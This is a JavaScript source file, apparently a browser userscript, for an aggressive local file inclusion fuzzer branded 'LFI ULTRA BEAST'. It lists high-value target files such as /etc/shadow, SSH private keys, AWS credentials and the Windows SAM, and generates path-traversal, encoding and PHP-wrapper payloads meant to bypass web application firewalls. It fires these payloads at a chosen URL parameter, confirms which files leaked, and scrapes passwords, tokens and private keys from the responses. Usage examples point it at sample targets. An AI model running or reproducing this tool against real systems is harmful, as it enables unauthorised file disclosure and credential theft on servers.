// ═══════════════════════════════════════════════════════════════════
// 🔥 LFI ULTRA BEAST - WAF FUCKING EDITION v2025
// Advanced Local File Inclusion Fuzzer with Intelligent Validation
// ═══════════════════════════════════════════════════════════════════

const LFI_ULTRA_BEAST = {
    // ═══════════════════════════════════════════════════════════════
    // 🎯 JUICY TARGET FILES - High-Value Data
    // ═══════════════════════════════════════════════════════════════
    JUICY_FILES: {
        // 🔴 CRITICAL - Credentials & Secrets
        credentials: [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/master.passwd',
            '/etc/security/passwd',
            '/.htpasswd',
            '/root/.bash_history',
            '/root/.ssh/id_rsa',
            '/root/.ssh/id_dsa',
            '/root/.ssh/authorized_keys',
            '/home/*/. ssh/id_rsa',
            '/.aws/credentials',
            '/.aws/config',
            '/var/www/.env',
            '/.env',
            '/config.php',
            '/wp-config.php',
            '/database.php',
            '/db.php',
            '/config.inc.php',
            '/_config.php',
            '/application/config/database.php',
            '/application/config/config.php',
            '/sites/default/settings.php',
            '/app/etc/local.xml',
            '/web.config',
            '/Web.config',
            '/WEB-INF/web.xml',
            '/WEB-INF/classes/application.properties',
            '/WEB-INF/classes/application.yml'
        ],

        // 🟠 HIGH - Application Configs
        configs: [
            '/etc/apache2/apache2.conf',
            '/etc/apache2/httpd.conf',
            '/etc/httpd/conf/httpd.conf',
            '/etc/nginx/nginx.conf',
            '/etc/nginx/sites-available/default',
            '/etc/php.ini',
            '/etc/php5/apache2/php.ini',
            '/etc/php/7.0/apache2/php.ini',
            '/etc/php/7.4/apache2/php.ini',
            '/etc/php/8.0/apache2/php.ini',
            '/etc/my.cnf',
            '/etc/mysql/my.cnf',
            '/etc/postgresql/pg_hba.conf',
            '/etc/redis/redis.conf',
            '/etc/mongod.conf',
            '/opt/lampp/etc/httpd.conf',
            '/xampp/apache/conf/httpd.conf',
            '/usr/local/apache2/conf/httpd.conf',
            '/usr/local/etc/apache22/httpd.conf',
            '/private/etc/apache2/httpd.conf'
        ],

        // 🟡 MEDIUM - Logs & Debug Info
        logs: [
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/apache/access.log',
            '/var/log/apache/error.log',
            '/var/log/httpd/access_log',
            '/var/log/httpd/error_log',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            '/var/log/auth.log',
            '/var/log/syslog',
            '/var/log/messages',
            '/var/log/secure',
            '/var/log/mysql/error.log',
            '/var/log/mysql.log',
            '/var/log/postgresql/postgresql.log',
            '/var/log/redis/redis.log',
            '/var/www/logs/access.log',
            '/var/www/logs/error.log',
            '/proc/self/environ',
            '/proc/self/cmdline',
            '/proc/self/status',
            '/proc/self/fd/0',
            '/proc/self/fd/1',
            '/proc/self/fd/2'
        ],

        // 🔵 INFO - System Information
        system: [
            '/etc/issue',
            '/etc/os-release',
            '/etc/lsb-release',
            '/etc/hostname',
            '/etc/hosts',
            '/etc/resolv.conf',
            '/etc/network/interfaces',
            '/proc/version',
            '/proc/cpuinfo',
            '/proc/meminfo',
            '/proc/mounts',
            '/proc/net/arp',
            '/proc/net/route',
            '/proc/net/tcp',
            '/proc/net/udp'
        ],

        // ⚫ WINDOWS - Windows-specific
        windows: [
            'C:/Windows/win.ini',
            'C:/Windows/system.ini',
            'C:/Windows/System32/drivers/etc/hosts',
            'C:/Windows/System32/config/SAM',
            'C:/Windows/System32/config/SYSTEM',
            'C:/Windows/System32/config/SECURITY',
            'C:/Windows/repair/SAM',
            'C:/Windows/repair/SYSTEM',
            'C:/boot.ini',
            'C:/inetpub/wwwroot/web.config',
            'C:/inetpub/logs/LogFiles/W3SVC1/u_ex*.log',
            'C:/Program Files/Apache Group/Apache2/conf/httpd.conf',
            'C:/xampp/apache/conf/httpd.conf',
            'C:/xampp/mysql/bin/my.ini',
            'C:/xampp/php/php.ini'
        ]
    },

    // ═══════════════════════════════════════════════════════════════
    // 🛡️ WAF BYPASS PAYLOADS - BEAST MODE
    // ═══════════════════════════════════════════════════════════════
    WAF_BYPASS_TECHNIQUES: {
        // Null byte injection
        nullByte: ['%00', '\x00', '%2500'],

        // Path traversal variations
        traversal: [
            '../', '..\\', '..../', '....\\', ' ..;/', '..;\\',
            '%2e%2e/', '%2e%2e\\', '%252e%252e/', '%252e%252e\\',
            '..%2f', '..%5c', '..%252f', '..%255c',
            '..%c0%af', '..%c1%9c', '..%c0%9v',
            '....//', '....\\\\', '.../.../', '...\\...\\',
            '..%ef%bc%8f', '..%ef%bc%bc',
            '..%e2%80%a5%ef%bc%8f', '..%e2%80%a5%ef%b9%a8'
        ],

        // Encoding bypasses
        encoding: {
            // Double encoding
            double: (path) => encodeURIComponent(encodeURIComponent(path)),

            // UTF-8 overlong
            utf8: (path) => path.replace(/\//g, '%c0%af').replace(/\\/g, '%c0%5c'),

            // UTF-16
            utf16: (path) => path.replace(/\//g, '%u002f').replace(/\\/g, '%u005c'),

            // Unicode
            unicode: (path) => path.replace(/\//g, '\\u002f').replace(/\\/g, '\\u005c'),

            // Base64
            base64: (path) => btoa(path),

            // Hex
            hex: (path) => Array.from(path).map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(''),

            // Mixed case
            mixedCase: (path) => {
                let result = '';
                for (let i = 0; i < path.length; i++) {
                    result += Math.random() > 0.5 ? path[i].toUpperCase() : path[i].toLowerCase();
                }
                return result;
            }
        },

        // Protocol wrappers (PHP)
        wrappers: [
            'php://filter/convert.base64-encode/resource=',
            'php://filter/read=string.rot13/resource=',
            'php://filter/convert.iconv.utf-8.utf-16/resource=',
            'php://filter/convert.iconv.utf-8.utf-7/resource=',
            'php://filter/zlib.deflate/resource=',
            'php://filter/zlib.inflate/resource=',
            'php://input',
            'php://stdin',
            'data://text/plain;base64,',
            'expect://id',
            'file://',
            'zip://',
            'phar://',
            'glob://',
            'rar://'
        ],

        // Bypass filters
        filters: {
            // Bypass "../" filter
            dotdotslash: [
                '....//....//....//....//....//....//....//....//etc/passwd',
                '....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd',
                '..../..../..../..../..../..../..../..../etc/passwd',
                '.../.../.../.../.../.../.../.../etc/passwd'
            ],

            // Bypass "etc/passwd" filter
            etcPasswd: [
                '/e?c/?asswd',
                '/e*c/*asswd',
                '/[e]tc/[p]asswd',
                '/etc/./passwd',
                '/etc/passwd/.',
                '/./etc/./passwd',
                '/etc//passwd',
                '/etc/passwd%00',
                '/etc/passwd%0a',
                '/etc/passwd%0d'
            ]
        }
    },

    // ═══════════════════════════════════════════════════════════════
    // 🎯 PAYLOAD GENERATION ENGINE
    // ═══════════════════════════════════════════════════════════════
    generatePayloads: function (targetFile, depth = 10) {
        const payloads = [];
        const techniques = this.WAF_BYPASS_TECHNIQUES;

        // 1. Basic traversal (different depths)
        for (let i = 1; i <= depth; i++) {
            techniques.traversal.forEach(trav => {
                payloads.push(trav.repeat(i) + targetFile);
                payloads.push('/' + trav.repeat(i) + targetFile);
            });
        }

        // 2. Null byte variations
        techniques.nullByte.forEach(nb => {
            payloads.push(`../../../../../../../${targetFile}${nb}`);
            payloads.push(`${targetFile}${nb}`);
            payloads.push(`${targetFile}${nb}.jpg`);
            payloads.push(`${targetFile}${nb}.html`);
        });

        // 3. Encoding bypasses
        const encodings = techniques.encoding;
        payloads.push(encodings.double(targetFile));
        payloads.push(encodings.utf8(targetFile));
        payloads.push(encodings.hex(targetFile));
        payloads.push(encodings.base64(targetFile));

        // 4. PHP wrappers
        techniques.wrappers.forEach(wrapper => {
            payloads.push(wrapper + targetFile);
        });

        // 5. Mixed techniques (WAF confusion)
        payloads.push(`....//....//....//....//....//....//....//....//etc/passwd`);
        payloads.push(`..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f${targetFile}`);
        payloads.push(`..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af${targetFile}`);
        payloads.push(`%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/${targetFile}`);
        payloads.push(`%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f${targetFile}`);

        // 6. Windows-specific
        if (targetFile.includes('C:/') || targetFile.includes('C:\\')) {
            payloads.push(targetFile.replace(/\//g, '\\'));
            payloads.push(targetFile.replace(/\\/g, '/'));
            payloads.push(targetFile.replace(/C:/g, 'C:\\'));
            payloads.push(targetFile.replace(/C:\\/g, 'C:/'));
        }

        // 7. Case variations (bypass case-sensitive filters)
        payloads.push(encodings.mixedCase(targetFile));

        // 8. Absolute path variations
        payloads.push(targetFile);
        payloads.push('/' + targetFile);
        payloads.push('//' + targetFile);
        payloads.push('///' + targetFile);

        return [...new Set(payloads)]; // Remove duplicates
    },

    // ═══════════════════════════════════════════════════════════════
    // ✅ VALIDATION ENGINE - Detect Successful LFI
    // ═══════════════════════════════════════════════════════════════
    VALIDATION_SIGNATURES: {
        // Linux/Unix file signatures
        linux: {
            '/etc/passwd': [
                'root:',
                'daemon:',
                'bin:',
                'sys:',
                '/bin/bash',
                '/bin/sh',
                '/sbin/nologin',
                'nobody:',
                'www-data:'
            ],
            '/etc/shadow': [
                'root:$',
                'root:!',
                'daemon:*',
                ':$1$',
                ':$6$',
                '::0:0:99999:'
            ],
            '/etc/hosts': [
                '127.0.0.1',
                'localhost',
                '::1'
            ],
            '/proc/self/environ': [
                'PATH=',
                'HOME=',
                'USER=',
                'SHELL=',
                'PWD='
            ],
            'apache_log': [
                'GET /',
                'POST /',
                'HTTP/1.',
                'Mozilla/',
                'User-Agent:',
                '" 200 ',
                '" 404 '
            ],
            'php_config': [
                '<?php',
                'define(',
                'DB_HOST',
                'DB_USER',
                'DB_PASSWORD',
                'DB_NAME',
                '$db_host',
                '$db_user',
                '$db_pass'
            ]
        },

        // Windows file signatures
        windows: {
            'win.ini': [
                '[fonts]',
                '[extensions]',
                '[mci extensions]',
                '[files]',
                '[Mail]'
            ],
            'boot.ini': [
                '[boot loader]',
                '[operating systems]',
                'multi(',
                'partition(',
                'rdisk('
            ],
            'SAM': [
                'SAM',
                'Domains',
                'Account',
                'Users'
            ],
            'web.config': [
                '<configuration>',
                '<appSettings>',
                '<connectionStrings>',
                'add key=',
                'add name='
            ]
        },

        // Generic indicators
        generic: {
            'config_file': [
                'password',
                'passwd',
                'secret',
                'api_key',
                'apikey',
                'token',
                'database',
                'connection',
                'credentials'
            ],
            'source_code': [
                'function ',
                'class ',
                'import ',
                'require(',
                'include(',
                'namespace ',
                'use '
            ],
            'error_disclosure': [
                'Warning:',
                'Fatal error:',
                'Parse error:',
                'Notice:',
                'Deprecated:',
                'Stack trace:',
                'on line ',
                'in /'
            ]
        }
    },

    // Validate if response contains file content
    validateResponse: function (response, targetFile) {
        const text = response.toLowerCase();
        const results = {
            isVulnerable: false,
            confidence: 0,
            matchedSignatures: [],
            fileType: null,
            sensitiveData: []
        };

        // Check for error pages (false positives)
        const errorIndicators = ['404', '403', '500', 'not found', 'forbidden', 'access denied'];
        if (errorIndicators.some(err => text.includes(err))) {
            return results;
        }

        // Determine expected file type
        let signatures = [];
        if (targetFile.includes('passwd')) {
            signatures = this.VALIDATION_SIGNATURES.linux['/etc/passwd'];
            results.fileType = 'passwd';
        } else if (targetFile.includes('shadow')) {
            signatures = this.VALIDATION_SIGNATURES.linux['/etc/shadow'];
            results.fileType = 'shadow';
        } else if (targetFile.includes('win.ini')) {
            signatures = this.VALIDATION_SIGNATURES.windows['win.ini'];
            results.fileType = 'win.ini';
        } else if (targetFile.includes('boot.ini')) {
            signatures = this.VALIDATION_SIGNATURES.windows['boot.ini'];
            results.fileType = 'boot.ini';
        } else if (targetFile.includes('web.config')) {
            signatures = this.VALIDATION_SIGNATURES.windows['web.config'];
            results.fileType = 'web.config';
        } else if (targetFile.includes('log')) {
            signatures = this.VALIDATION_SIGNATURES.linux['apache_log'];
            results.fileType = 'log';
        } else if (targetFile.includes('.php') || targetFile.includes('config')) {
            signatures = this.VALIDATION_SIGNATURES.linux['php_config'];
            results.fileType = 'config';
        } else {
            // Use generic signatures
            signatures = [
                ...this.VALIDATION_SIGNATURES.generic.config_file,
                ...this.VALIDATION_SIGNATURES.generic.source_code
            ];
            results.fileType = 'generic';
        }

        // Check for signature matches
        let matchCount = 0;
        signatures.forEach(sig => {
            if (text.includes(sig.toLowerCase())) {
                matchCount++;
                results.matchedSignatures.push(sig);
            }
        });

        // Calculate confidence
        if (matchCount > 0) {
            results.isVulnerable = true;
            results.confidence = Math.min((matchCount / signatures.length) * 100, 100);
        }

        // Check for sensitive data
        const sensitivePatterns = {
            'password': /password["\s:=]+([^\s"'<>]+)/gi,
            'api_key': /api[_-]?key["\s:=]+([^\s"'<>]+)/gi,
            'secret': /secret["\s:=]+([^\s"'<>]+)/gi,
            'token': /token["\s:=]+([^\s"'<>]+)/gi,
            'database': /db[_-]?(host|user|pass|name)["\s:=]+([^\s"'<>]+)/gi,
            'email': /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g,
            'ip_address': /\b(?:\d{1,3}\.){3}\d{1,3}\b/g,
            'private_key': /-----BEGIN (RSA |DSA )?PRIVATE KEY-----/i
        };

        Object.entries(sensitivePatterns).forEach(([type, pattern]) => {
            const matches = response.match(pattern);
            if (matches) {
                results.sensitiveData.push({
                    type,
                    count: matches.length,
                    samples: matches.slice(0, 3) // First 3 matches
                });
            }
        });

        return results;
    },

    // ═══════════════════════════════════════════════════════════════
    // 🚀 MAIN FUZZING ENGINE
    // ═══════════════════════════════════════════════════════════════
    fuzzEndpoint: async function (baseUrl, paramName, options = {}) {
        const {
            targetFiles = ['etc/passwd', 'etc/shadow'],
            depth = 10,
            delay = 100,
            onProgress = null,
            onVulnFound = null
        } = options;

        const results = {
            tested: 0,
            vulnerable: [],
            errors: 0,
            startTime: Date.now()
        };

        console.log(`[LFI-BEAST] 🎯 Starting fuzzing on ${baseUrl}?${paramName}=`);
        console.log(`[LFI-BEAST] 📁 Target files: ${targetFiles.length}`);

        for (const targetFile of targetFiles) {
            const payloads = this.generatePayloads(targetFile, depth);
            console.log(`[LFI-BEAST] 🔥 Generated ${payloads.length} payloads for ${targetFile}`);

            for (const payload of payloads) {
                try {
                    const testUrl = `${baseUrl}?${paramName}=${encodeURIComponent(payload)}`;

                    // Make request
                    const response = await this.makeRequest(testUrl);
                    results.tested++;

                    // Validate response
                    const validation = this.validateResponse(response.body, targetFile);

                    if (validation.isVulnerable) {
                        const vuln = {
                            url: testUrl,
                            param: paramName,
                            payload: payload,
                            targetFile: targetFile,
                            confidence: validation.confidence,
                            matchedSignatures: validation.matchedSignatures,
                            fileType: validation.fileType,
                            sensitiveData: validation.sensitiveData,
                            responseLength: response.body.length,
                            timestamp: new Date().toISOString()
                        };

                        results.vulnerable.push(vuln);
                        console.log(`[LFI-BEAST] 🎯 VULNERABLE! ${testUrl}`);
                        console.log(`[LFI-BEAST] ✅ Confidence: ${validation.confidence.toFixed(2)}%`);
                        console.log(`[LFI-BEAST] 📝 Matched: ${validation.matchedSignatures.join(', ')}`);

                        if (onVulnFound) {
                            onVulnFound(vuln);
                        }
                    }

                    if (onProgress) {
                        onProgress({
                            tested: results.tested,
                            total: targetFiles.length * payloads.length,
                            vulnerable: results.vulnerable.length
                        });
                    }

                    // Delay between requests
                    if (delay > 0) {
                        await this.sleep(delay);
                    }

                } catch (error) {
                    results.errors++;
                    console.error(`[LFI-BEAST] ❌ Error testing ${payload}:`, error.message);
                }
            }
        }

        results.endTime = Date.now();
        results.duration = results.endTime - results.startTime;

        console.log(`[LFI-BEAST] ✅ Fuzzing complete!`);
        console.log(`[LFI-BEAST] 📊 Tested: ${results.tested} payloads`);
        console.log(`[LFI-BEAST] 🎯 Vulnerable: ${results.vulnerable.length}`);
        console.log(`[LFI-BEAST] ⏱️ Duration: ${(results.duration / 1000).toFixed(2)}s`);

        return results;
    },

    // ═══════════════════════════════════════════════════════════════
    // 🌐 HTTP REQUEST HANDLER
    // ═══════════════════════════════════════════════════════════════
    makeRequest: function (url) {
        return new Promise((resolve, reject) => {
            if (typeof GM_xmlhttpRequest !== 'undefined') {
                // Tampermonkey environment
                GM_xmlhttpRequest({
                    method: 'GET',
                    url: url,
                    timeout: 10000,
                    onload: (response) => {
                        resolve({
                            status: response.status,
                            body: response.responseText,
                            headers: response.responseHeaders
                        });
                    },
                    onerror: (error) => reject(error),
                    ontimeout: () => reject(new Error('Timeout'))
                });
            } else {
                // Browser fetch API
                fetch(url)
                    .then(response => response.text().then(body => ({
                        status: response.status,
                        body: body,
                        headers: response.headers
                    })))
                    .then(resolve)
                    .catch(reject);
            }
        });
    },

    sleep: (ms) => new Promise(resolve => setTimeout(resolve, ms)),

    // ═══════════════════════════════════════════════════════════════
    // 📊 EXPORT RESULTS
    // ═══════════════════════════════════════════════════════════════
    exportResults: function (results, format = 'json') {
        if (format === 'json') {
            return JSON.stringify(results, null, 2);
        } else if (format === 'markdown') {
            let md = `# LFI Fuzzing Results\n\n`;
            md += `**Tested:** ${results.tested} payloads\n`;
            md += `**Vulnerable:** ${results.vulnerable.length}\n`;
            md += `**Duration:** ${(results.duration / 1000).toFixed(2)}s\n\n`;

            if (results.vulnerable.length > 0) {
                md += `## Vulnerabilities Found\n\n`;
                results.vulnerable.forEach((vuln, idx) => {
                    md += `### ${idx + 1}. ${vuln.targetFile}\n\n`;
                    md += `- **URL:** \`${vuln.url}\`\n`;
                    md += `- **Payload:** \`${vuln.payload}\`\n`;
                    md += `- **Confidence:** ${vuln.confidence.toFixed(2)}%\n`;
                    md += `- **Matched Signatures:** ${vuln.matchedSignatures.join(', ')}\n`;
                    if (vuln.sensitiveData.length > 0) {
                        md += `- **Sensitive Data Found:**\n`;
                        vuln.sensitiveData.forEach(data => {
                            md += `  - ${data.type}: ${data.count} matches\n`;
                        });
                    }
                    md += `\n`;
                });
            }

            return md;
        }
    }
};

// ═══════════════════════════════════════════════════════════════════
// 🎯 USAGE EXAMPLES
// ═══════════════════════════════════════════════════════════════════

/*
// Example 1: Basic fuzzing
LFI_ULTRA_BEAST.fuzzEndpoint(
    'https://target.com/page.php',
    'file',
    {
        targetFiles: ['etc/passwd', 'etc/shadow', 'var/log/apache2/access.log'],
        depth: 15,
        delay: 200,
        onVulnFound: (vuln) => {
            console.log('🎯 FOUND:', vuln.url);
            console.log('📝 Confidence:', vuln.confidence + '%');
        }
    }
).then(results => {
    console.log('Final Results:', results);
    const markdown = LFI_ULTRA_BEAST.exportResults(results, 'markdown');
    console.log(markdown);
});

// Example 2: Test all juicy files
const allJuicyFiles = [
    ...LFI_ULTRA_BEAST.JUICY_FILES.credentials,
    ...LFI_ULTRA_BEAST.JUICY_FILES.configs,
    ...LFI_ULTRA_BEAST.JUICY_FILES.logs
];

LFI_ULTRA_BEAST.fuzzEndpoint(
    'https://target.com/download.php',
    'path',
    {
        targetFiles: allJuicyFiles,
        depth: 20,
        delay: 100
    }
);

// Example 3: Generate payloads only
const payloads = LFI_ULTRA_BEAST.generatePayloads('/etc/passwd', 10);
console.log('Generated payloads:', payloads);

// Example 4: Validate a response
const response = 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin';
const validation = LFI_ULTRA_BEAST.validateResponse(response, '/etc/passwd');
console.log('Validation:', validation);
*/

// Export for use in other modules
if (typeof module !== 'undefined' && module.exports) {
    module.exports = LFI_ULTRA_BEAST;
}
